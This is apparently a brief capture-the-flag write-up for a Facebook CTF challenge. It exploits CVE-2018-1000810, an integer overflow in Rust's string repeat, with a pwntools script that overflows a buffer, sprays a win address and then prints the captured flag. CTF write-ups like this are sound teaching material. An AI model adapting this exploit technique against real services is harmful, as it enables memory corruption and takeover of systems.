CVE-2018-1000810  
1.  Calculate overflow size  
2.  Spray win address  
3.  ????  
4.  PROFIT

The script is not reliable, so better monitor debug log.

```  
from pwn import *

NUM_REPEATS = 2305843009213693953  
WIN = 0x30f620  
WIN_PTR = 0x701E40  
while True:  
	r = remote("challenges.fbctf.com",1342)  
	try:  
		r.sendlineafter("6","1")  
		r.sendlineafter("Name: ",p64(WIN_PTR))  
		r.sendlineafter("Description: ","")  
		r.sendlineafter("Price:","1.0")  
		r.sendlineafter("\n","4")  
		r.sendlineafter("add: ","1")  
		r.sendlineafter("Count: ",str(NUM_REPEATS))  
		r.sendlineafter("\n","6")  
		flag = r.recvuntil("}")  
		log.success("FLAG : "+flag+"}")  
		pause()  
		r.close()  
	except:  
		try:  
			r.close()  
		except:  
			pass  
	NUM_REPEATS += 1  
r.interactive()

```

FLAG : fb{s4f3_l4nguag3s_arent_always_safe}